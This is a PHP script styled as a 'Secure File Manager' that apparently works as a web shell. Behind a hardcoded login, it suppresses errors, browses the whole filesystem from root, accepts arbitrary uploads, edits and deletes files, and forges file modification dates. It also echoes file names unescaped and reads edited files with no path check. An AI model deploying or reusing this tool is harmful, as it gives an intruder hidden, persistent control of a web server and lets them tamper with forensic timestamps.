<?php
error_reporting(0);
set_time_limit(0);
ini_set('display_errors', 0);
ini_set('memory_limit', '-1');
header("X-Requested-With: XMLHttpRequest");
header("Cache-Control: no-cache, no-store, must-revalidate");
session_start();

// Logout functionality
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Authentication credentials - CHANGE THESE TO YOUR OWN VALUES
$valid_username = "admin";
$valid_password = "securepassword123";

// Handle login form submission
if (isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    if ($username === $valid_username && $password === $valid_password) {
        $_SESSION['authenticated'] = true;
        $_SESSION['username'] = $username;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Invalid username or password!";
    }
}

// Check if user is authenticated
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Display login form
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>File Manager Login</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-gray-100 flex items-center justify-center h-screen">
        <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
            <h2 class="text-2xl font-bold text-gray-800 mb-6 text-center">File Manager Login</h2>
            <?php if (isset($login_error)): ?>
                <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4"><?php echo $login_error; ?></div>
            <?php endif; ?>
            <form method="post">
                <div class="mb-4">
                    <input type="text" name="username" placeholder="Username" required 
                           class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                </div>
                <div class="mb-6">
                    <input type="password" name="password" placeholder="Password" required 
                           class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                </div>
                <button type="submit" name="login" 
                        class="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50 transition duration-200">
                    Login
                </button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Set current path
$path = isset($_GET['dir']) ? realpath(base64_decode($_GET['dir'])) : getcwd();
if (!$path) {
    $path = DIRECTORY_SEPARATOR;
}

// Format file size
function formatSize($size) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < 4) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . " " . $units[$i];
}

// Format date
function formatDate($timestamp) {
    return date('Y-m-d H:i:s', $timestamp);
}

// Breadcrumbs navigation
function breadcrumbs($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $breadcrumb = "<a href='?dir=" . base64_encode(DIRECTORY_SEPARATOR) . "' class='text-blue-600 hover:text-blue-800 font-medium'>Root</a>";
    $currentPath = DIRECTORY_SEPARATOR;
    foreach ($parts as $part) {
        if ($part == "") continue;
        $currentPath .= $part . DIRECTORY_SEPARATOR;
        $breadcrumb .= " / <a href='?dir=" . base64_encode($currentPath) . "' class='text-blue-600 hover:text-blue-800 font-medium'>$part</a>";
    }
    return $breadcrumb;
}

// Create file
if (isset($_POST['create_file'])) {
    $fileName = trim($_POST['file_name']);
    $fileContent = $_POST['file_content'];
    $filePath = $path . DIRECTORY_SEPARATOR . $fileName;
    
    if (empty($fileName)) {
        echo "<div id='notification' class='fixed top-4 right-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded shadow-lg z-50'>File name cannot be empty!</div>";
    } elseif (file_exists($filePath)) {
        echo "<div id='notification' class='fixed top-4 right-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded shadow-lg z-50'>File already exists!</div>";
    } elseif (preg_match('/[^a-zA-Z0-9-_\.]/', $fileName)) {
        echo "<div id='notification' class='fixed top-4 right-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded shadow-lg z-50'>File name contains invalid characters!</div>";
    } else {
        file_put_contents($filePath, $fileContent);
        echo "<div id='notification' class='fixed top-4 right-4 bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded shadow-lg z-50'>File created successfully!</div>";
    }
}

// File upload
if (isset($_FILES['upld'])) {
    $uploadDir = $path . DIRECTORY_SEPARATOR;
    $uploadFile = $uploadDir . basename($_FILES['upld']['name']);
    if (move_uploaded_file($_FILES['upld']['tmp_name'], $uploadFile)) {
        echo "<div id='notification' class='fixed top-4 right-4 bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded shadow-lg z-50'>File uploaded successfully: <a href='" . htmlspecialchars($_FILES['upld']['name']) . "' target='_blank' class='text-blue-600 hover:text-blue-800 underline'>" . htmlspecialchars($_FILES['upld']['name']) . "</a></div>";
    } else {
        echo "<div id='notification' class='fixed top-4 right-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded shadow-lg z-50'>Failed to upload file.</div>";
    }
}

// Delete item
if (isset($_GET['del'])) {
    $target = realpath($path . DIRECTORY_SEPARATOR . base64_decode($_GET['del']));
    if (strpos($target, realpath($path)) !== 0) {
        die("Security violation detected!");
    }
    if (is_dir($target)) {
        rmdir($target);
    } else {
        unlink($target);
    }
    header("Location: ?dir=" . base64_encode($path));
    exit;
}

// Rename item
if (isset($_POST['chg'])) {
    $oldName = realpath($path . DIRECTORY_SEPARATOR . base64_decode($_POST['old_name']));
    $newName = $path . DIRECTORY_SEPARATOR . trim($_POST['new_name']);
    
    // Security check
    if (strpos($oldName, realpath($path)) !== 0) {
        die("Security violation detected!");
    }
    
    if (file_exists($oldName)) {
        rename($oldName, $newName);
    }
    
    header("Location: ?dir=" . base64_encode($path));
    exit;
}

// Edit file
if (isset($_POST['mod'])) {
    $file = realpath($path . DIRECTORY_SEPARATOR . base64_decode($_POST['file']));
    
    // Security check
    if (strpos($file, realpath($path)) !== 0) {
        die("Security violation detected!");
    }
    
    safeWrite($file, $_POST['content']);
    header("Location: ?dir=" . base64_encode($path));
    exit;
}

// Modify date
if (isset($_POST['modify_date'])) {
    $item = realpath($path . DIRECTORY_SEPARATOR . base64_decode($_POST['item']));
    $newDate = strtotime($_POST['new_date']);
    
    // Security check
    if (strpos($item, realpath($path)) !== 0) {
        die("Security violation detected!");
    }
    
    if (touch($item, $newDate)) {
        echo "<div id='notification' class='fixed top-4 right-4 bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded shadow-lg z-50'>Date modified successfully!</div>";
    } else {
        echo "<div id='notification' class='fixed top-4 right-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded shadow-lg z-50'>Failed to modify date!</div>";
    }
    
    header("Location: ?dir=" . base64_encode($path));
    exit;
}

function safeWrite($file, $content) {
    $f = fopen($file, "w");
    fwrite($f, $content);
    fclose($f);
}

// Create folder
if (isset($_POST['create_folder'])) {
    $newFolder = trim($_POST['folder_name']);
    $newPath = $path . DIRECTORY_SEPARATOR . $newFolder;
    if (preg_match('/[^a-zA-Z0-9-_ ]/', $newFolder)) {
        echo "<div id='notification' class='fixed top-4 right-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded shadow-lg z-50'>Folder name cannot contain special characters!</div>";
    } elseif (empty($newFolder)) {
        echo "<div id='notification' class='fixed top-4 right-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded shadow-lg z-50'>Folder name cannot be empty!</div>";
    } elseif (file_exists($newPath)) {
        echo "<div id='notification' class='fixed top-4 right-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded shadow-lg z-50'>Folder already exists!</div>";
    } else {
        mkdir($newPath, 0777, true);
        echo "<div id='notification' class='fixed top-4 right-4 bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded shadow-lg z-50'>Folder created successfully!</div>";
    }
}

// Scan directory
$items = scandir($path);
$folders = [];
$files = [];

foreach ($items as $item) {
    if ($item == '.' || $item == '..') continue;
    $filePath = $path . DIRECTORY_SEPARATOR . $item;
    if (is_dir($filePath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
sort($files, SORT_NATURAL | SORT_FLAG_CASE);
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom styles for file manager */
        .file-manager-table tr:nth-child(even) {
            background-color: #f9fafb;
        }
        .file-manager-table tr:hover {
            background-color: #eff6ff;
        }
        
        /* Modal animations */
        .modal {
            transition: opacity 0.3s ease;
        }
        .modal-content {
            transition: transform 0.3s ease, opacity 0.3s ease;
            transform: translateY(-20px);
            opacity: 0;
        }
        .modal.show .modal-content {
            transform: translateY(0);
            opacity: 1;
        }
        
        /* Tooltip styles */
        .tooltip {
            position: relative;
            display: inline-block;
        }
        
        .tooltip .tooltiptext {
            visibility: hidden;
            width: 140px;
            background-color: #555;
            color: #fff;
            text-align: center;
            border-radius: 6px;
            padding: 5px;
            position: absolute;
            z-index: 1;
            bottom: 125%;
            left: 50%;
            margin-left: -70px;
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .tooltip:hover .tooltiptext {
            visibility: visible;
            opacity: 1;
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen">
    <div class="container mx-auto px-4 py-6">
        <!-- Header -->
        <div class="flex flex-col md:flex-row justify-between items-start md:items-center mb-6">
            <h1 class="text-2xl font-bold text-gray-800 mb-4 md:mb-0">File Manager</h1>
            
            <div class="flex flex-wrap items-center gap-3">
                <button onclick="openModal('folderModal')" class="bg-green-600 hover:bg-green-700 text-white py-2 px-4 rounded-md transition duration-200 flex items-center">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-1" viewBox="0 0 20 20" fill="currentColor">
                        <path fill-rule="evenodd" d="M2 6a2 2 0 012-2h4l2 2h4a2 2 0 012 2v1H8a3 3 0 00-3 3v1.5a1.5 1.5 0 01-3 0V6z" clip-rule="evenodd" />
                        <path d="M6 12a2 2 0 012-2h8a2 2 0 012 2v2a2 2 0 01-2 2H2h2a2 2 0 002-2v-2z" />
                    </svg>
                    Create Folder
                </button>
                <button onclick="openModal('fileModal')" class="bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-md transition duration-200 flex items-center">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-1" viewBox="0 0 20 20" fill="currentColor">
                        <path fill-rule="evenodd" d="M4 4a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2V8a2 2 0 00-2-2h-5L9 4H4z" clip-rule="evenodd" />
                    </svg>
                    Create File
                </button>
                <button onclick="openModal('uploadModal')" class="bg-purple-600 hover:bg-purple-700 text-white py-2 px-4 rounded-md transition duration-200 flex items-center">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-1" viewBox="0 0 20 20" fill="currentColor">
                        <path fill-rule="evenodd" d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clip-rule="evenodd" />
                    </svg>
                    Upload File
                </button>
                <span class="text-gray-700">Logged in as: <strong class="text-gray-900"><?php echo htmlspecialchars($_SESSION['username']); ?></strong></span>
                <a href="?logout=true" class="bg-red-600 hover:bg-red-700 text-white py-2 px-4 rounded-md transition duration-200">Logout</a>
            </div>
        </div>
        
        <!-- Breadcrumbs -->
        <div class="mb-6 p-3 bg-white rounded-lg shadow">
            <p class="text-gray-700"><?php echo breadcrumbs($path); ?></p>
        </div>
        
        <!-- Files Table -->
        <div class="bg-white rounded-lg shadow overflow-hidden">
            <table class="min-w-full file-manager-table">
                <thead>
                    <tr class="bg-blue-600 text-white">
                        <th class="py-3 px-4 text-left font-semibold uppercase">Name</th>
                        <th class="py-3 px-4 text-left font-semibold uppercase">Size</th>
                        <th class="py-3 px-4 text-left font-semibold uppercase">Type</th>
                        <th class="py-3 px-4 text-left font-semibold uppercase">Last Modified</th>
                        <th class="py-3 px-4 text-left font-semibold uppercase">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($folders as $folder): ?>
                    <tr>
                        <td class="py-3 px-4 border-b">
                            <a href="?dir=<?php echo base64_encode($path . DIRECTORY_SEPARATOR . $folder); ?>" class="text-blue-600 hover:text-blue-800 font-medium"><?php echo $folder; ?></a>
                        </td>
                        <td class="py-3 px-4 border-b">-</td>
                        <td class="py-3 px-4 border-b">Folder</td>
                        <td class="py-3 px-4 border-b">
                            <div class="flex items-center">
                                <span id="date-<?php echo base64_encode($folder); ?>"><?php echo formatDate(filemtime($path . DIRECTORY_SEPARATOR . $folder)); ?></span>
                                <button onclick="copyDate('<?php echo base64_encode($folder); ?>')" class="ml-2 text-gray-500 hover:text-blue-600 tooltip">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                    </svg>
                                    <span class="tooltiptext">Copy Date</span>
                                </button>
                            </div>
                        </td>
                        <td class="py-3 px-4 border-b">
                            <a href="?chg=<?php echo base64_encode($folder); ?>&dir=<?php echo base64_encode($path); ?>" class="text-blue-600 hover:text-blue-800 mr-2">RENAME</a>
                            <button onclick="openModifyDateModal('<?php echo base64_encode($folder); ?>')" class="text-yellow-600 hover:text-yellow-800 mr-2">MODIFY DATE</button>
                            <a href="?del=<?= base64_encode($folder); ?>&dir=<?= base64_encode($path); ?>" onclick="return confirm('Delete this folder?');" class="text-red-600 hover:text-red-800">DELETE</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                    <?php foreach ($files as $file): ?>
                    <tr>
                        <td class="py-3 px-4 border-b"><?php echo $file; ?></td>
                        <td class="py-3 px-4 border-b"><?php echo formatSize(filesize($path . DIRECTORY_SEPARATOR . $file)); ?></td>
                        <td class="py-3 px-4 border-b">File</td>
                        <td class="py-3 px-4 border-b">
                            <div class="flex items-center">
                                <span id="date-<?php echo base64_encode($file); ?>"><?php echo formatDate(filemtime($path . DIRECTORY_SEPARATOR . $file)); ?></span>
                                <button onclick="copyDate('<?php echo base64_encode($file); ?>')" class="ml-2 text-gray-500 hover:text-blue-600 tooltip">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                    </svg>
                                    <span class="tooltiptext">Copy Date</span>
                                </button>
                            </div>
                        </td>
                        <td class="py-3 px-4 border-b">
                            <a href="?mod=<?php echo base64_encode($file); ?>&dir=<?php echo base64_encode($path); ?>" class="text-blue-600 hover:text-blue-800 mr-2">EDIT</a>
                            <a href="?chg=<?php echo base64_encode($file); ?>&dir=<?php echo base64_encode($path); ?>" class="text-blue-600 hover:text-blue-800 mr-2">RENAME</a>
                            <button onclick="openModifyDateModal('<?php echo base64_encode($file); ?>')" class="text-yellow-600 hover:text-yellow-800 mr-2">MODIFY DATE</button>
                            <a href="?del=<?= base64_encode($file); ?>&dir=<?= base64_encode($path); ?>" onclick="return confirm('Delete this file?');" class="text-red-600 hover:text-red-800">DELETE</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        
        <!-- Create Folder Modal -->
        <div id="folderModal" class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 hidden">
            <div class="modal-content bg-white rounded-lg shadow-xl w-full max-w-md">
                <div class="p-6">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="text-xl font-bold text-gray-800">Create Folder</h3>
                        <button onclick="closeModal('folderModal')" class="text-gray-500 hover:text-gray-700">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                            </svg>
                        </button>
                    </div>
                    <form method="post" class="space-y-4">
                        <div>
                            <input type="text" name="folder_name" placeholder="Enter folder name" required 
                                   class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500">
                        </div>
                        <div class="flex justify-end space-x-3">
                            <button type="button" onclick="closeModal('folderModal')" class="px-4 py-2 border border-gray-300 rounded-md text-gray-700 hover:bg-gray-100">Cancel</button>
                            <button type="submit" name="create_folder" class="bg-green-600 hover:bg-green-700 text-white py-2 px-4 rounded-md transition duration-200">Create Folder</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- Create File Modal -->
        <div id="fileModal" class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 hidden">
            <div class="modal-content bg-white rounded-lg shadow-xl w-full max-w-md">
                <div class="p-6">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="text-xl font-bold text-gray-800">Create File</h3>
                        <button onclick="closeModal('fileModal')" class="text-gray-500 hover:text-gray-700">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                            </svg>
                        </button>
                    </div>
                    <form method="post" class="space-y-4">
                        <div>
                            <input type="text" name="file_name" placeholder="Enter file name (e.g., example.txt)" required 
                                   class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                        </div>
                        <div>
                            <textarea name="file_content" placeholder="Enter initial file content (optional)" rows="4"
                                      class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
                        </div>
                        <div class="flex justify-end space-x-3">
                            <button type="button" onclick="closeModal('fileModal')" class="px-4 py-2 border border-gray-300 rounded-md text-gray-700 hover:bg-gray-100">Cancel</button>
                            <button type="submit" name="create_file" class="bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-md transition duration-200">Create File</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- Upload File Modal -->
        <div id="uploadModal" class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 hidden">
            <div class="modal-content bg-white rounded-lg shadow-xl w-full max-w-md">
                <div class="p-6">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="text-xl font-bold text-gray-800">Upload File</h3>
                        <button onclick="closeModal('uploadModal')" class="text-gray-500 hover:text-gray-700">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                            </svg>
                        </button>
                    </div>
                    <form method="POST" enctype="multipart/form-data" class="space-y-4">
                        <div>
                            <input type="file" name="upld" 
                                   class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500">
                        </div>
                        <div class="flex justify-end space-x-3">
                            <button type="button" onclick="closeModal('uploadModal')" class="px-4 py-2 border border-gray-300 rounded-md text-gray-700 hover:bg-gray-100">Cancel</button>
                            <button type="submit" class="bg-purple-600 hover:bg-purple-700 text-white py-2 px-4 rounded-md transition duration-200">Upload</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- Modify Date Modal -->
        <div id="modifyDateModal" class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 hidden">
            <div class="modal-content bg-white rounded-lg shadow-xl w-full max-w-md">
                <div class="p-6">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="text-xl font-bold text-gray-800">Modify Date</h3>
                        <button onclick="closeModal('modifyDateModal')" class="text-gray-500 hover:text-gray-700">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                            </svg>
                        </button>
                    </div>
                    <form method="post" class="space-y-4">
                        <div>
                            <label class="block text-gray-700 text-sm font-bold mb-2" for="new_date">
                                New Date and Time (YYYY-MM-DD HH:MM:SS)
                            </label>
                            <input type="text" name="new_date" id="new_date" placeholder="e.g., 2025-08-18 12:04:16" required 
                                   class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-500">
                        </div>
                        <input type="hidden" name="item" id="item_to_modify">
                        <div class="flex justify-end space-x-3">
                            <button type="button" onclick="closeModal('modifyDateModal')" class="px-4 py-2 border border-gray-300 rounded-md text-gray-700 hover:bg-gray-100">Cancel</button>
                            <button type="submit" name="modify_date" class="bg-yellow-600 hover:bg-yellow-700 text-white py-2 px-4 rounded-md transition duration-200">Modify Date</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- Edit File Modal -->
        <?php if (isset($_GET['mod'])): ?>
        <div id="editModal" class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 show">
            <div class="modal-content bg-white rounded-lg shadow-xl w-full max-w-2xl">
                <div class="p-6">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="text-xl font-bold text-gray-800">Edit File: <?php echo htmlspecialchars(base64_decode($_GET['mod'])); ?></h3>
                        <a href="?dir=<?php echo base64_encode($path); ?>" class="text-gray-500 hover:text-gray-700">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                            </svg>
                        </a>
                    </div>
                    <form method="post">
                        <textarea name="content" rows="15" 
                                  class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 mb-4 font-mono"><?php echo htmlspecialchars(file_get_contents($path . DIRECTORY_SEPARATOR . base64_decode($_GET['mod']))); ?></textarea>
                        <input type="hidden" name="file" value="<?php echo $_GET['mod']; ?>">
                        <div class="flex justify-end space-x-3">
                            <a href="?dir=<?php echo base64_encode($path); ?>" class="px-4 py-2 border border-gray-300 rounded-md text-gray-700 hover:bg-gray-100">Cancel</a>
                            <button type="submit" name="mod" class="bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-md transition duration-200">Save</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php endif; ?>
        
        <!-- Rename Modal -->
        <?php if (isset($_GET['chg'])): ?>
        <div id="renameModal" class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 show">
            <div class="modal-content bg-white rounded-lg shadow-xl w-full max-w-md">
                <div class="p-6">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="text-xl font-bold text-gray-800">Rename: <?php echo htmlspecialchars(base64_decode($_GET['chg'])); ?></h3>
                        <a href="?dir=<?php echo base64_encode($path); ?>" class="text-gray-500 hover:text-gray-700">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                            </svg>
                        </a>
                    </div>
                    <form method="post">
                        <textarea name="new_name" rows="2" 
                                  class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 mb-4"><?php echo htmlspecialchars(base64_decode($_GET['chg'])); ?></textarea>
                        <input type="hidden" name="old_name" value="<?php echo $_GET['chg']; ?>">
                        <div class="flex justify-end space-x-3">
                            <a href="?dir=<?php echo base64_encode($path); ?>" class="px-4 py-2 border border-gray-300 rounded-md text-gray-700 hover:bg-gray-100">Cancel</a>
                            <button type="submit" name="chg" class="bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-md transition duration-200">Rename</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php endif; ?>
        
        <!-- Footer -->
        <div class="mt-8 text-center text-gray-500 text-sm">
            &copy; <?php echo date("Y"); ?> | Secure File Manager
        </div>
    </div>
    
    <script>
        // Modal functions
        function openModal(modalId) {
            const modal = document.getElementById(modalId);
            modal.classList.remove('hidden');
            setTimeout(() => {
                modal.classList.add('show');
            }, 10);
        }
        
        function closeModal(modalId) {
            const modal = document.getElementById(modalId);
            modal.classList.remove('show');
            setTimeout(() => {
                modal.classList.add('hidden');
            }, 300);
        }
        
        // Open modify date modal
        function openModifyDateModal(itemId) {
            // Get the current date string
            const currentDate = document.getElementById('date-' + itemId).innerText;
            
            // Set the current date in the input field
            document.getElementById('new_date').value = currentDate;
            document.getElementById('item_to_modify').value = itemId;
            
            openModal('modifyDateModal');
        }
        
        // Close modals when clicking outside
        document.addEventListener('click', function(event) {
            if (event.target.classList.contains('modal')) {
                const modalId = event.target.id;
                closeModal(modalId);
            }
        });
        
        // Copy date function
        function copyDate(fileId) {
            const dateElement = document.getElementById('date-' + fileId);
            const dateText = dateElement.innerText;
            
            // Create a temporary input element to copy the text
            const tempInput = document.createElement('input');
            tempInput.value = dateText;
            document.body.appendChild(tempInput);
            tempInput.select();
            document.execCommand('copy');
            document.body.removeChild(tempInput);
            
            // Show notification
            const notification = document.createElement('div');
            notification.className = 'fixed top-4 right-4 bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded shadow-lg z-50';
            notification.textContent = 'Date copied to clipboard!';
            document.body.appendChild(notification);
            
            // Auto-hide notification
            setTimeout(() => {
                notification.style.opacity = '0';
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 300);
            }, 2000);
        }
        
        // Auto-hide notifications
        window.addEventListener('load', function() {
            const notification = document.getElementById('notification');
            if (notification) {
                setTimeout(() => {
                    notification.style.opacity = '0';
                    setTimeout(() => {
                        notification.style.display = 'none';
                    }, 300);
                }, 3000);
            }
        });
    </script>
</body>
</html>